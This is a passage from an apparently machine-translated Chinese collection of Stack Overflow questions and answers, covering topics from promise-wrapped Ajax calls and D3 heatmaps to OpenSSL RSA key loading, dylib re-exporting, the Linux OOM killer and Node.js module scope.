在函数内部声明一个 promise 对象，将 Ajax 调用封装在该 promise 函数中并返回该 promise 对象。

```
 function foo1() {
     var promise = new Promise(function(resolve, reject)
     {
       $.ajax({
       url: 'https://jsonplaceholder.typicode.com/todos/1',
       success: function(response) {
           console.log(response);
           resolve(response);
           // return response; // <- I tried that one as well
         }
       });
     });
     return promise;
   }

   foo1()
   .then(function(response)
   {
     console.log('Promise resolved:');
     console.log(response);
   })
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
```

* * *

## 回答 #37

> 赞同：7
> 
> 时间：2019-09-10T07:25:53.897

我认为无论使用什么方法或机制，或者无论框架是什么（Angular/React）对你隐藏它，以下原则都成立：

1.  在程序的流程中（想想代码甚至是最低层：机器码），数据可能2秒后回不来，3秒后，或者根本就没有，所以没有平时`return`使用的顺序返回数据。

2.  这是经典的“观察者模式”。（它可以是“回调”的形式。）它是：“嘿，我很想知道数据是否成功到达；当它成功时你能告诉我吗？” 因此，您注册了一个观察者以得到通知（或调用一个函数来通知数据成功到达。）您通常还注册一个观察者来通知此类数据的到达失败。

3.  当数据成功到达，或数据返回失败时，注册的观察者（或回调）将与数据一起被通知（或与数据一起调用）。如果观察者是以回调函数的形式注册的`foo`，那么`foo(data)`就会被调用。如果观察者是以对象的形式注册的`foo`，那么根据接口，它可能会`foo.notify(data)`被调用。

* * *

## 回答 #38

> 赞同：7
> 
> 时间：2020-05-12T09:56:33.080

最初，回调用于异步操作（例如，在[XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)中）。现在浏览器的[Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)等基于 Promise 的 API已成为默认解决方案，[`async/await`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)所有现代浏览器和 Node.js（服务器端）都支持更好的语法。

一个常见的场景 - 从服务器获取 JSON 数据 - 可能如下所示：

```
async function fetchResource(url) {
  const res = await fetch(url);
  if (!res.ok) {
    throw new Error(res.statusText);
  }
  return res.json();
} 
```

要在另一个函数中使用它：

```
async function doSomething() {
  try {
    const data = await fetchResource("https://example.test/resource/1");
    // ...
  } catch (e) {
    // Handle error
    ...
  }
} 
```

如果您设计一个现代 API，强烈建议您更喜欢基于 Promise 的样式而不是回调。如果您继承了依赖回调的 API，则可以将其包装为 Promise：

```
function sleep(timeout) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve();
    }, timeout);
  });
}

async function fetchAfterTwoSeconds(url) {
  await sleep(2000);
  return fetchResource(url);
} 
```

在历史上完全依赖回调的 Node.js 中，这种技术非常普遍，以至于他们添加了一个名为[`util.promisify`](https://nodejs.org/api/util.html#util_util_promisify_original).

* * *

## 回答 #39

> 赞同：2
> 
> 时间：2020-11-08T10:17:11.017

## 异步：假

我通过设置`async`为 false 并重组我的 Ajax 调用来解决它：

我设置了一个全局函数`sendRequest(type, url, data)`，每次调用三个参数：

```
function sendRequest(type, url, data) {
    let returnValue = null;
    $.ajax({
        url: url,
        type: type,
        async: false,
        data: data,
        dataType: 'json',
        success: function (resp) {
            returnValue = resp;
        }
    });
    return returnValue;
} 
```

现在调用函数：

```
let password = $("#password").val();
        let email = $("#email").val();
        let data = {
            email: email,
            password: password,
        };
        let  resp =  sendRequest('POST', 'http://localhost/signin')}}", data);
        console.log(resp); 
```

> 代码中的重要**说明**是： `async: false`

如果此解决方案不适用于您，请注意这可能不适用于某些浏览器或[jQuery](https://en.wikipedia.org/wiki/JQuery)版本。

* * *

## 回答 #40

> 赞同：2
> 
> 时间：2019-04-16T16:13:16.973

`async/await`与[Babel](https://en.wikipedia.org/wiki/Babel_(transcompiler))之类的编译器一起使用以使其在旧浏览器中工作。你还必须从 npm 安装这个 Babel 预设和 polyfill `npm i -D babel-preset-env babel-polyfill`：。

```
function getData(ajaxurl) { 
  return $.ajax({
    url: ajaxurl,
    type: 'GET',
  });
};

async test() {
  try {
    const res = await getData('https://api.icndb.com/jokes/random')
    console.log(res)
  } catch(err) {
    console.log(err);
  }
}

test(); 
```

或者`.then`回调只是编写相同逻辑的另一种方式。

```
getData(ajaxurl).then(function(res) {
    console.log(res)
} 
```

* * *

## 回答 #41

> 赞同：-4
> 
> 时间：2018-12-02T12:41:39.607

[将 Node.js 上的XHR](https://en.wikipedia.org/wiki/XMLHttpRequest)转换为 async-await 的简单代码示例

```
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
var xhttp = new XMLHttpRequest();

function xhrWrapWithPromise() {
  return new Promise((resolve, reject) => {
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4) {
        if (this.status == 200) {
          resolve(this.responseText);
        } else {
          reject(new Error("Couldn't feth data finally"));
        }
      }
    };
    xhttp.open("GET", "https://www.w3schools.com/xml/xmlhttp_info.txt", true);
    xhttp.send();
  });
}

// We need to wrap await in Async function so and anonymous IIFE here
(async _ => {
  try {
    let result = await xhrWrapWithPromise();
    console.log(result);
  } catch (error) {
    console.log(error);
  }
})(); 
```

* * *

## 回答 #42

> 赞同：-6
> 
> 时间：2020-10-31T17:17:55.947

由于`await`总是返回一个 Promise，只需做一个额外的`await`（在`async`函数内部）来提取值：

```
test(); // This alerts "hello"

// This is the outer function that wants to get the string result of inner()
async function test() {
  var str=await await inner();
  alert(str);
} // test

// This ia an inner function that can do arbitrary async operations
async function inner() {
  return Promise.resolve('hello');
}
```*************

# c# - 除非用户登录到打印计算机，否则 PrintDocument.Print 很慢

> ID：14220322
> 
> 赞同：1
> 
> 时间：2013-01-08T17:06:15.927
> 
> 标签：c#, web-services, printing, remote-desktop, printdocument

我有一个托管在服务器“A”（SA）上的 Web 应用程序和一个托管在服务器“B”（SB）上的用于打印的 Web 服务。SA 创建需要打印的图像并将其发送给 SB。这样做时，打印速度相当慢，大约 15 秒。但是，如果我使用远程桌面作为用户从托管在 SA 上的应用程序的 webconfig 登录到 SB，那么它将在不到两秒的时间内打印出来。当我登录它时，它似乎正在启动某些东西，这使它打印得更快。知道这可能是什么吗？是否有一种方法可以让我在未登录的情况下保持快速打印？

**编辑：**正在打印的图像大小约为 20 KB。

这是托管在 SB 上的服务的代码：

```
public void PrintImage(Stream printImage, string printServer, string printer)
    {
        string printerName = String.Format(@"\\{0}\{1}", printServer, printer);

        Image image = Image.FromStream(printImage);

        PrintDocument printDocument = new PrintDocument();
        PrinterSettings settings = new PrinterSettings();
        settings.PrinterName = printerName;
        printDocument.PrinterSettings = settings;

        printDocument.PrintPage += (s, e) =>
        {
            e.Graphics.DrawImage(image, 0, 0);
        };

        printDocument.Print();
    } 
```

感谢您花时间阅读本文:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-14T18:44:55.840

我们发现，如果我们在 SB 上创建打印机映射，它在没有远程桌面连接的情况下执行速度也一样快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-04T22:27:34.740

请注意，通常不支持从 Web 应用程序（或服务）进行打印。请参阅[msdn](https://msdn.microsoft.com/en-us/library/system.drawing.printing%28v=vs.100%29.aspx)和[此 SO 帖子](https://stackoverflow.com/questions/7990/printing-from-a-net-service/8094#8094)。

# javascript - 使用滑块更新 D3 热图颜色范围

> ID：14220330
> 
> 赞同：1
> 
> 时间：2013-01-08T17:06:34.557
> 
> 标签：javascript, jquery, slider, d3.js, heatmap

我正在使用 D3 和 JQuery Slider 生成一个热图，当我更改滑块的光标位置（代表色标范围）时，它的颜色会自动刷新。虽然当我第一次单击滑块时它工作正常，但之后似乎并没有刷新。如果您想指出我的错误，我会发布来源：

```
<HEAD>
<TITLE>Heatmap</TITLE>
</HEAD>
<BODY BGCOLOR="WHITE">

<CENTER>
<H1>Heatmap</H1>

<H5>Heatmap should instantly display bidimensional data (adjustable thresholds)</H5>

<script src="http://d3js.org/d3.v3.min.js"></script>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css" />

<div id="slider"></div>
<p>
 <div id="heatmap"></div>

<script>

var minval= 0;
var maxval= 1000;

$( "#slider" ).slider({
    range: true,
    min: 0,
    max: 1000,
    values: [0, 1000],
    slide: function( event, ui ) {
      var minval = ui.values[0];
      var maxval = ui.values[1];
      console.log("begin:", minval, "end:", maxval);
      draw(minval, maxval); 
    }
});

var margin = {top: 0, right: 20, bottom: 20, left: 20},
    width = 300 - margin.left - margin.right,
    height = 300 - margin.top - margin.bottom;

var svg = d3.select("#heatmap").append("svg:svg");

var data = [[1000,500,1],[500,1,1000],[1000,54,800]];

var x = d3.scale.linear()
    .range([0, width])
    .domain([0,data[0].length]);

var y = d3.scale.linear()
    .range([0, height])
    .domain([0,data.length]);

svg.attr("width", width + margin.left + margin.right)
        .attr("height", height + margin.top + margin.bottom)
        .append("g")
        .attr("transform", "translate(" + margin.left + "," + margin.top + ")");

var colorLow = 'white', colorMed = 'green', colorHigh = 'red';

function draw(minval,maxval){

    var colorScale = d3.scale.linear()
         .domain([minval, maxval])
         .range([colorLow, colorHigh]);

    var row = svg.selectAll(".row")
            .data(data)
            .enter().append("svg:g")
            .attr("class", "row");

    var col = row.selectAll(".cell")
               .data(function (d,i) { return d.map(function(a) { return {value: a, row: i}; } ) })
               .enter().append("svg:rect")
                 .attr("class", "cell")
                 .attr("x", function(d, i) { return x(i); })
                 .attr("y", function(d, i) { return y(d.row); })
                 .attr("width", x(1))
                 .attr("height", y(1))
                 .style("fill", function(d) { return colorScale(d.value); });

}

</script>
</head>
<body>

</CENTER>
</body> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T18:46:00.880

它第二次不起作用，因为您正在对选择进行操作，第二次调用`.enter()`它将为空，因为元素已经存在。`draw()`

要解决此问题，请将声明移到`row`函数`col`之外`draw()`。在`draw()`函数内部，只保留实际更改的代码。就像是

```
function draw(minval,maxval){
    var colorScale = d3.scale.linear()
         .domain([minval, maxval])
         .range([colorLow, colorHigh]);
    col.style("fill", function(d) { return colorScale(d.value); });
} 
```

# bash - 如何将源文件识别为硬链接？Bash 脚本

> ID：14220333
> 
> 赞同：1
> 
> 时间：2013-01-08T17:06:41.390
> 
> 标签：bash, shell, command-line, hyperlink

我正在制作一个 shell 脚本来识别目录的硬链接，但我需要知道源文件。例子：

```
Ln origen1.txt destino1.txt

Ln origen1.txt destino2.txt

Ln origen1.txt destino2.txt 
```

输出应该是 origen1.txt，因为这是其他硬链接的源文件。这应该在 bash 中。我需要帮助，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:11:45.417

你不能。如果您有一个文件`file1`，并且您使用以下命令创建一个硬链接`ln`：

```
ln file1 file2 
```

那么这两个文件是无法区分的。“硬链接”实际上与普通文件条目一样。它恰好指向与另一个条目相同的文件。您可以删除其中任何一个，然后您将恢复为文件的单个“硬链接”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T21:01:26.580

就像人们指出的那样，硬链接都是等价的。但是，您可以使用它`find`来查找文件的所有硬链接：

```
find / -samefile destino2.txt 
```

它不会说第一个链接是哪个链接，但它会告诉你所有可能的候选人。

# c++ - 如何将 RSA 公钥和私钥读入单个 RSA 结构？

> ID：14220340
> 
> 赞同：3
> 
> 时间：2013-01-08T17:07:03.693
> 
> 标签：c++, c, openssl, rsa, public-key-encryption

我要做的是生成随机的 RSA 密钥，然后在我的程序终止之前存储它们。这部分使用 RSA_generate_key、PEM_write_bio_RSAPrivateKey 和 PEM_write_bio_RSA_PUBKEY 工作得很好。我也可以使用 RSA_generate_key 返回的 RSA 结构来加密/解密。

但是，当我的程序重新启动并且我想读回我之前存储的密钥时，我的问题就出现了。我可以使用 PEM_read_bio_RSAPrivateKey 和 PEM_read_bio_RSA_PUBKEY 来提取密钥，但我需要将它们放入相同的 RSA 结构中，类似于 RSA_generate_key 存储它们的方式。

我的代码如下所示。我将密钥与一个小标题一起存储在内存中，告诉我密钥有多大。私钥紧跟在标头之后，公钥存储在紧跟私钥之后。

```
privateKey = (uint8_t *) ( buffer + rsaStruct->hdrSize );
publicKey = (uint8_t *) ( privateKey + rsaStruct->privateKeyLength );

bioPrivate = BIO_new_mem_buf( (void *) privateKey, rsaStruct->privateKeyLength );
bioPublic = BIO_new_mem_buf( (void *) publicKey, rsaStruct->publicKeyLength );

bioPrivate = BIO_new_mem_buf( (void *) privateKey, rsaStruct->privateKeyLength + rsaStruct->publicKeyLength );
if( bioPrivate == NULL || bioPublic == NULL ) {
    fprintf( stderr, "%s: BIO_new_mem_buf failed!\n", __FUNCTION__ );
    return ECE_RSA_ERROR_BIO_CREATION_FAILED;
}

PEM_read_bio_RSAPrivateKey( bioPrivate, &keyPair, NULL, NULL );
PEM_read_bio_RSA_PUBKEY( bioPublic, &keyPair, NULL, NULL );

BIO_free( bioPrivate );
BIO_free( bioPublic ); 
```

如果我尝试只发送相同的 RSA 结构，它似乎不起作用。我能够很好地加密，但我的解密失败。这可能是由于公共密钥是最后检索的密钥并且用于加密的事实。如果第二次调用覆盖了我的 RSA 结构的地址，我最终会得到一个只有公钥的 RSA 结构。

无论如何，如果有人能告诉我如何将公钥和私钥都放入同一个 RSA 结构中，那就太好了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T19:23:21.220

与 RSA 私钥相比，公钥额外只包含公共指数。所以只需将它从公钥复制到私钥结构，一切都应该工作。

# shared-libraries - 我可以构建一个 .dylib 包括其他一些 .dylib 符号（在 C 中）吗？

> ID：14220343
> 
> 赞同：1
> 
> 时间：2013-01-08T17:07:12.063
> 
> 标签：shared-libraries, dylib, dynamic-library

我正在尝试创建一个 .dylib 包括其他 .dylib 符号

例如：我有 libA.dylib 和 libB.dylib，我想制作包含 libA 和 libB 符号的 libcore.dylib

我知道我可以使用 Ao 和 Bo 制作 libcore.dylib

```
gcc -dynamiclib -Wall -install_name libmycore.dylib -headerpad_max_install_names -o libmycore.dylib ../A/A.o ../B/B.o 
```

然后用 nm -g libcore.dylib ：我可以找到 AFunctions 符号和 BFunctions 符号

现在我想知道是否可以使用我尝试过的 libA.dylib 和 libB.dylib 构建 libcore.dylib：

```
gcc -dynamiclib -Wall -install_name libmycore.dylib -headerpad_max_install_names -o libmycore.dylib -L../A/ -lA -L../B/ -lB 
```

我当然没有编译错误，但是 libcore 中没有引用 libA 和 libB 符号，只是依赖于 nm -g libcore.dylib 我没有符号

有办法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-14T17:28:40.007

我终于找到了一种方法：

```
gcc -dynamiclib -o libmycore.dylib -Wl,-reexport_library,PATH_TO_LIB/libA.dylib -Wl,-reexport_library,PATH_TO_LIB/libB.dylib 
```

找到正确的语法并不容易，但一切都在这里“解释”：

[http://www.opensource.apple.com/source/ld64/ld64-85/unit-tests/test-cases/re-export-cases/Makefile](http://www.opensource.apple.com/source/ld64/ld64-85/unit-tests/test-cases/re-export-cases/Makefile)

# image - 如何在matlab中计算几个灰度图像的平均值？

> ID：14220345
> 
> 赞同：0
> 
> 时间：2013-01-08T17:07:38.317
> 
> 标签：image, matlab, vectorization

我有一组图像，我想在 Matlab 中计算这些图像的平均值，然后从所有图像中减去平均值。然后，通过 Matlab 中的 hist 函数绘制图像的分布。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:20:23.340

我想图像的大小相同，例如，如果您有 3 张图像，则以下代码将执行您的操作：

```
images       = image1 + image + image3;
meanOfImages = images ./ 3;
image1       = image1 - meanOfImages; 
image2       = image2 - meanOfImages; 
image3       = image3 - meanOfImages; 
```

这个想法是对所有图像求和，然后将得到的矩阵元素除以图像数量，这将是它们的平均值，然后从每个图像矩阵中减去这个矩阵。

# python - Ubuntu上的python：如何捕获内存不足异常？

> ID：14220347
> 
> 赞同：2
> 
> 时间：2013-01-08T17:07:48.753
> 
> 标签：python, memory, ubuntu

我在 Ubuntu AWS EC2 实例上运行的 python 脚本中有以下块：

```
try:
    data = json.loads(line)
    # further processing of data
except Exception, e:  
    # something went bad 
```

`line`是从文本文件中提取的字符串。在大多数情况下，它会得到很好的处理。时不时地，我会得到一些非常棒的台词。在这种情况下，脚本终止（“-9”）并`dmesg -T`显示如下消息`[Tue Jan 8 16:10:48 2013] Out of memory: Kill process 13609 (python) score 910 or sacrifice child`

我不明白的是为什么它没有在`try-except`块中捕获异常而不是崩溃。是否可以在此块中进行更改，以使脚本不会崩溃但引发异常？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:17:08.683

您的 Python 进程正在被内核 OOM（内存不足）杀手 ( [docs](http://linux-mm.org/OOM_Killer) ) 杀死。这正在杀死 Python `SIGKILL`，因此 Python 没有任何机会响应此事件......因此它无法为您的代码生成任何异常。

您可能需要在具有更多资源的环境中运行您的进程（这样您就不会占用如此大比例的系统内存），或者您可能需要限制您可以读取的 JSON 数据的大小。

我在下面发布的链接之一提到[了 ijson](http://pypi.python.org/pypi/ijson/)，它是一个迭代 JSON 解析器。这可能比标准的 JSON 解析器更节省内存，但我还没有尝试过。

# jquery - 浮动可拖动框在调整大小时消失

> ID：14220348
> 
> 赞同：1
> 
> 时间：2013-01-08T17:07:57.163
> 
> 标签：jquery, html, css, draggable

我正在尝试创建一个浮动窗口，该窗口在调整大小时保持在边距内：

您可以查看代码。

[http://jsfiddle.net/jxgUU/6/](http://jsfiddle.net/jxgUU/6/)

我该如何做到这一点？

```
$(function()
{
    $("#result").draggable();
});    

#result 
{ 
    border:1px solid #000;
    width:375px;
    position:absolute;
    z-index:100;
    left:75%x;
    top:100px;
    margin-left: -10px;     
    margin-top:  -50px;   
    cursor:move;
    color:black;
}

<div id="result"  class="ui-widget-content" >
    <div style="background-color:#096db5;color:white;font-size:9px;text-align:center;">
        click window to drag
    </div>
    <div id="info">
        blah
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-09T21:41:51.267

我终于找到了一个脚本，当它在调整大小时会自动居中框。

资源：

[http://jqueryui.com/position/#default](http://jqueryui.com/position/#default)

这是最终代码：

```
$(window).resize(function(){
    $("#result").position({
        of: "#wrapper",
        my: "center  middle",
        at: "center middle",    
        collision: "fit flip"
    })//$("#result").position({
 });//$(window).resize(function(){ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:52:20.463

设置[包含](http://api.jqueryui.com/draggable/#option-containment)选项：

```
$("#result").draggable({ containment: "window" }); 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/jxgUU/18/)**

# css - 如何将两个元素放在一起？

> ID：14220351
> 
> 赞同：1
> 
> 时间：2013-01-08T17:07:58.233
> 
> 标签：css

***HTML：***

```
<div class="epBtn">
    <span class="thumbnail">
        <img src="episodes/1.jpg" />
    </span>
    <span class="play">Episode 1</span>
</div> 
```

在 CSS 方面，我能做些什么来制作`.thumbnail`并`.play`出现在彼此旁边而不使用`float`?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:12:23.780

**使用`inline-block`：**

```
<div class="epBtn">
    <span class="thumbnail">
        <img src="episodes/1.jpg" />
    </span>
    <span class="play">Episode 1</span>
</div> 
```

**CSS：**

```
.thumbnail, .play { display: inline-block; vertical-align: middle; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:19:57.273

我已经在下面的地址模拟了我相信您正在尝试完成的事情。这是通过将缩略图的区域（在本例中为左侧）设置为容器中的边距空间，然后将拇指绝对定位到该容器内的中心来完成的。由于容器的高度通常是已知的（通过拇指），因此您可以使用`top`css 属性将相关内容垂直居中。由于容器也是相对位置，因此绝对定位的内容将是绝对的。

[JSFiddle](http://jsfiddle.net/bAEGm/1/)

```
.epBtn {
    /* These are cosmetic except for height, which you should know. */
    max-width: 170px;
    margin: 10px;
    height: 60px;
    background-color: #eee;
    border: 1px solid #ccc;
    position: relative;
    font-family: arial;
}
.play {
    top: 20px;
    margin-left: 65px;
    position:relative;
}
.thumbnail {
    position: absolute;
    top: 5px;
    left: 5px;
} 
```

Please let me know if this what you had in mind.

# c# - Windows azure 表访问时间过长

> ID：14220359
> 
> 赞同：1
> 
> 时间：2013-01-08T17:08:26.720
> 
> 标签：c#, performance, azure, azure-table-storage

我正在使用 Windows azure 表存储。我的问题是从表中访问给定用户的实体需要很长时间。我用来访问表的代码如下：

```
 public CloudTableQuery<T> GetEntites(string username)  
   {
        try
        {
            CloudTableQuery<T> entries =
                (from e in ServiceContext.CreateQuery<T>(TableName)
                 where e.PartitionKey == username
                 select e).AsTableServiceQuery();

            return entries;
        }
        catch (Exception)
        { return null; }
    } 
```

表中的实体总数目前只有 100 个左右。例如：查询似乎需要 40 秒才能为给定用户返回 25 个实体。请建议代码是否有任何改进空间以提高性能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T01:53:23.653

这里真正的问题是您返回的是查询而不是实体，并且您可能会为每个返回的实体（查询）再次执行查询。使用以下内容定义您的实体：

```
public class UserEntity
{
    public string UserName { get; set; }
    public string Name { get; set; }
    public string Email { get; set; }
} 
```

然后使用以下内容定义您的表存储实体：

```
public class StoredUserEntity : TableServiceEntity
{
    public StoredUserEntity (string username)
    {
        this.PartitionKey = username;
        this.RowKey = Guid.NewGuid().ToString();
        this.Timestamp = DateTime.Now;
    }

    public string Email { get; set; }
    public string Name { get; set; }
} 
```

那么您的查询实际上应该返回一个 UserEntities 列表：

```
 public List<UserEntity> GetUserData(string username)
    {
        var q = _tableContext.CreateQuery<StoredUserEntity>(_tableName);
        return
            q.ToList().Select(x => new UserEntity {UserName = x.PartitionKey, Email = x.Email, Name = x.Name}).Where(x => x.UserName == username).ToList();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-09T01:33:04.320

尝试使用 Fiddler 看看发生了什么。可能是您正在经历一些可能会减慢速度的重试。API 不会告诉您这一点，但使用 Fiddler，您可以准确地看到正在发出的请求、任何响应（以及错误）以及正在发出的请求数量。

# c# - 如何在xml中组合相同标签的值

> ID：14220360
> 
> 赞同：1
> 
> 时间：2013-01-08T17:08:34.863
> 
> 标签：c#, xml, tags

我是 XML 新手，在将 XML 中的 2 个值与相同的标签名称组合时遇到问题。

XML 示例，

```
 <point>
  <ref>
    <text>My name</text>
  </ref>
  <ref>
    <text>James</text>
  </ref>
 </point> 
```

我想得到“我的名字詹姆斯”的输出......有什么想法或解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:21:25.210

假设 Xml 文件位于`C:\Temp\test.xml`

```
string fileContent = File.ReadAllText(@"C:\Temp\test.xml");

var xml = XElement.Parse(fileContent);

              //select every node with name 'text' regardless of their location in DOM
var values  = xml.XPathSelectElements("//text")
                 .Select(element => element.Value);

string result = string.Join(" ", values);

Console.WriteLine (result); 
```

印刷

> 我的名字詹姆斯

如果您想要 path`point/ref/text`中的特定节点，请使用下一个`values`提取器

```
var values = xml.Descendants("ref")
                .Elements()
                .Where(node => node.Name == "text")
                .Select(node => node.Value); 
```

# matlab - 绘制的 GNU Octave 中的 Sin 具有尖锐的边缘

> ID：14220362
> 
> 赞同：0
> 
> 时间：2013-01-08T17:08:39.783
> 
> 标签：matlab, gnuplot, octave, trigonometry

这段代码有什么问题？

为什么它不是正常的罪曲线？

有没有更好的方法在 GNU Octave 中获取 1000 个 sin 曲线样本？

```
t = (0:1/1003:1);
A=4;
x=A*sin(2*pi*80*t);
axis([0,100,-4,4]) 
```

截屏： ![在此处输入图像描述](../Images/7ff025bcc9bc530a953e96eb090fe55f.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:10:12.303

如果您想要更平滑的曲线，则需要绘制更多点。尝试通过增加`1003`值来减少时间步长。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-23T10:47:20.143

只是采样率，你需要一个更高的。:) - 这是我有段时间读过的最有趣的东西。

将其视为块状或像素化，但用于向量。您需要更高的“分辨率”。

# php - PHP 数组对象集合问题

> ID：14220365
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:08:52.607
> 
> 标签：php

我有以下 PHP 代码：

```
class SQLStatements {
    public function __construct($iName) {
        $this->name = $iName;
        $this->sqlStatement = array ();
    }

    public function addStatement($iSQLStatement) {
        $this->sqlStatement [] = $iSQLStatement;
    }

...other functions...
}

print_r ($ss);
$sqlStatements->addStatement ( $ss );   
print_r ($sqlStatements); 
```

输出是：

```
SQL语句对象
(
    [id] => 300
    [时间戳] => 201301090222
    [夹具] => 主场 v 客场
    [结果] => 主页
    [fixtureDateTime] => 2013-01-11
    [bookmakerOdds] => 数组
        (
            [0] => 2.15
            [1] => 2.22
            [2] => 2.05
            [3] => 2.05
            [4] => 2.15
            [5] => 2.20
            [6] => 2.14
        )

)
SQLStatements 对象
(
    [名称] => 声明
    [sqlStatement] => 数组
        (
            [0] => SQLStatement 对象
                (
                    [id] => 300
                    [时间戳] => 201301090222
                    [夹具] => 主场 v 客场
                    [结果] => 主页
                    [fixtureDateTime] => 2013-01-11
                    [bookmakerOdds] => 数组
                        (
                            [0] => 2.15
                            [1] => 2.22
                            [2] => 2.05
                            [3] => 2.05
                            [4] => 2.15
                            [5] => 2.20
                            [6] => 2.14
                        )

                )

        )

)
SQL语句对象
(
    [id] => 300
    [时间戳] => 201301090222
    [夹具] => 主场 v 客场
    [结果] => 主场 v 客场 - 平局
    [fixtureDateTime] => 2013-01-11
    [bookmakerOdds] => 数组
        (
            [0] => 3.50
            [1] => 3.50
            [2] => 3.40
            [3] => 3.40
            [4] => 3.30
            [5] => 3.50
            [6] => 3.28
        )

)
SQLStatements 对象
(
    [名称] => 声明
    [sqlStatement] => 数组
        (
            [0] => SQLStatement 对象
                (
                    [id] => 300
                    [时间戳] => 201301090222
                    [夹具] => 主场 v 客场
                    [结果] => 主场 v 客场 - 平局
                    [fixtureDateTime] => 2013-01-11
                    [bookmakerOdds] => 数组
                        (
                            [0] => 3.50
                            [1] => 3.50
                            [2] => 3.40
                            [3] => 3.40
                            [4] => 3.30
                            [5] => 3.50
                            [6] => 3.28
                        )

                )

            [1] => SQLStatement 对象
                (
                    [id] => 300
                    [时间戳] => 201301090222
                    [夹具] => 主场 v 客场
                    [结果] => 主场 v 客场 - 平局
                    [fixtureDateTime] => 2013-01-11
                    [bookmakerOdds] => 数组
                        (
                            [0] => 3.50
                            [1] => 3.50
                            [2] => 3.40
                            [3] => 3.40
                            [4] => 3.30
                            [5] => 3.50
                            [6] => 3.28
                        )

                )

        )

)

```

`$ss`是一个`SQLStatement`对象，并且该`SQLStatements`对象是对象的集合`SQLStatement`。但是，从输出中可以看出，SQLStatements->SQLStatement[0] 和 SQLStatements->SQLStatement[1] 是相同的。我期待 SQLStatements->SQLStatement[0]->结果是 'Home'，而不是 'Home v Away - Draw'。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:11:38.350

当一个对象被传递给 PHP 中的一个方法时，PHP 实际上是在内存中传递该对象地址的值。这意味着，当您调用 时`addStatement($ss)`，您不会将`$ss`对象的副本添加到 statements 数组 - 您正在添加指向内存中该对象的指针。如果您稍后更改该`$ss`对象，它也会在您的 SQLStatements 类中的数组上发生更改（因为它们指向内存中的同一个对象）。

您应该做的是，在调用之后**，**`addStatement($ss)`您应该执行以下操作：`$ss = new SQLStatement()`然后您可以进行更改并再次添加它（通过创建一个您已经为这个新对象分配了另一个内存块，并且该位置有一个新内存不会与分配给的旧对象冲突的地址。）**`new SQLStatement()``$ss`**

# node.js - 使用 require 时丢失全局变量

> ID：14220368
> 
> 赞同：2
> 
> 时间：2013-01-08T17:08:57.680
> 
> 标签：node.js, scope, express

我正在尝试全局定义一些东西（下划线库、猫鼬、数据库连接，最终是权限对象）

应用程序.js

```
/* module dependencies */
const express = require('express');
const auth = require('http-auth');
const underscore = require('underscore');
const expressValidator = require('express-validator');
const mongo = require('mongodb');
const db = require('./library/db');
/*end module dependencies */

/*routes files*/
const post = require('./routes/post');
/* end route files */

/* start the app instance */
var app = express();

/* authentication */
var basic = auth({
  authRealm : "Private area.",
  authList : ['Shi:many222', 'Lota:123456']
});
/* end authentication*/

/* pass app as an argument to the use method */
app.configure(function () {
  app.use(express.logger('dev'));
  app.use(express.bodyParser());
  app.use(expressValidator);
  app.use(db);
  //app.use(underscore);
  /* config debugging */
  app.configure('development', function(){
    app.use(express.errorHandler({ dumpExceptions: true, showStack: true }));
  });
  /* production instance */
  app.configure('production', function(){
    app.use(express.errorHandler());
  });
  /* end config debugging */
});

/* start route management */
app.get('/post', function(req, res) {
  basic.apply(req, res, function(username) {
    post.use(app);
    post.findAll(req, res);
  });
});
app.get('/post/:id', function(req, res) {
  post.findById(req, res);
});

/* port management */
var port = 8000;
app.listen(port);
console.log('Listening: port: '+port); 
```

post.js

```
 // Module dependencies
const underscore = require("underscore");

// placeholder for app instance
var app;

// add a use function to exports that we can access from our app
exports.use = function (appInstance) {
  // make app instance available in post.js
  app = appInstance;
};

/* find all rows */
exports.findAll = function(req, res) {
  console.log('Post:findAll');
  app.db.collection('Post', function(err, collection) {
    collection.find({},{limit: 100}).toArray(function(err, items) {
      res.send(exports.parseModels(items));
    });
  });
};

/* parse a single or all items passed to it for formatting */
exports.parseModels = function (items) {
  underscore.each(items, function(key, val) {
    console.log('underscore parsed an object');
  });
  return items;
}; 
```

数据库.js

```
var mongo = require('mongodb');

var Server = mongo.Server,
  Db = mongo.Db,
  BSON = mongo.BSONPure;

var server = new Server('localhost', 27017, {auto_reconnect: true});
var db = new Db('website', server);

db.open(function(err, db) {
